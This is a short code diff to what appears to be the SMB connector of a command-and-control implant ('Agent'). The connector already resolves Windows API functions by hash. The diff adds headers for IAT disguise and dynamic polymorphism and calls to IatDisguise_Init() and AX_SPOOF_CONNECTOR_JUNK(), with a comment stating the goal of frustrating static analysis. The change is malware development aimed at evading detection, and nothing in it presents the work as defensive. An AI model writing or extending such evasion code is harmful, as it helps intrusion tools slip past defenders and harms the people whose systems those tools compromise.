@@ -5,6 +5,8 @@
 #include "Crypt.h"
 #include "utils.h"
 #include "Agent.h"
+#include "IatDisguise.h"
+#include "DynamicPolymorphism.h"
 
 extern Agent* g_Agent;
 
@@ -50,6 +52,10 @@ Connector* CreateConnectorSMB()
 	data->functions->FreeSid                      = (decltype(FreeSid)*)                      GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_FREESID);
 	data->functions->SetEntriesInAclA             = (decltype(SetEntriesInAclA)*)             GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_SETENTRIESINACLA);
 	data->functions->SetSecurityDescriptorDacl    = (decltype(SetSecurityDescriptorDacl)*)    GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_SETSECURITYDESCRIPTORDACL);
+
+	// Disguise IAT entries to frustrate static analysis
+	IatDisguise_Init();
+	AX_SPOOF_CONNECTOR_JUNK();
 
     conn->SetProfile = ConnectorSMB_SetProfile;
     conn->WaitForConnection = ConnectorSMB_WaitForConnection;
